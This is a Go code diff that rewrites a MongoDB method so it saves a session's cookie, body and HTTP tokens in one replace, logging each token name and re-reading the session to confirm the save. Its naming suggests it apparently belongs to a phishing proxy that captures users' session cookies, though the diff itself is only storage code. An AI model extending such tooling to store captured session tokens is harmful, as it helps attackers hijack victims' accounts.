@@ -640,7 +640,81 @@ func (m *MongoDatabase) SetSessionCustom(sid string, name, value string) error {
 
 // SetSessionCookieTokens: update all tokens at once
 func (m *MongoDatabase) SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken, bodyTokens map[string]string, httpTokens map[string]string) error {
-	return m.UpdateSessionCookieTokens(sid, tokens, bodyTokens, httpTokens)
+	log.Debug("Saving all cookies for session %s", sid)
+	
+	// Get current session
+	session, err := m.GetSessionBySid(sid)
+	if err != nil {
+		return fmt.Errorf("failed to get session: %v", err)
+	}
+
+	// Convert all tokens to a single list
+	var allTokens []map[string]interface{}
+	
+	// Add cookie tokens
+	for domain, domainTokens := range tokens {
+		for name, token := range domainTokens {
+			tokenMap := map[string]interface{}{
+				"domain": domain,
+				"name":   name,
+				"value":  token.Value,
+				"path":   token.Path,
+				"secure": token.Secure,
+				"httpOnly": token.HttpOnly,
+				"expiration": token.ExpirationDate,
+			}
+			allTokens = append(allTokens, tokenMap)
+			log.Debug("Added cookie: %s (domain: %s)", name, domain)
+		}
+	}
+
+	// Add body tokens
+	for name, value := range bodyTokens {
+		tokenMap := map[string]interface{}{
+			"type":  "body",
+			"name":  name,
+			"value": value,
+		}
+		allTokens = append(allTokens, tokenMap)
+		log.Debug("Added body token: %s", name)
+	}
+
+	// Add HTTP tokens
+	for name, value := range httpTokens {
+		tokenMap := map[string]interface{}{
+			"type":  "http",
+			"name":  name,
+			"value": value,
+		}
+		allTokens = append(allTokens, tokenMap)
+		log.Debug("Added HTTP token: %s", name)
+	}
+
+	// Update session with all tokens
+	session.CookieTokens = tokens
+	session.BodyTokens = bodyTokens
+	session.HttpTokens = httpTokens
+
+	// Save to MongoDB
+	_, err = m.sessionsColl.ReplaceOne(
+		m.ctx,
+		bson.M{"session_id": sid},
+		session,
+	)
+	if err != nil {
+		return fmt.Errorf("failed to update session: %v", err)
+	}
+
+	// Verify the save
+	updatedSession, err := m.GetSessionBySid(sid)
+	if err != nil {
+		return fmt.Errorf("failed to verify save: %v", err)
+	}
+
+	log.Debug("Session updated successfully. Total tokens: %d", len(allTokens))
+	log.Debug("Cookies in session: %d", len(updatedSession.CookieTokens))
+	
+	return nil
 }
 
 // UpdateSessionCountryInfo يحدث معلومات البلد للجلسة
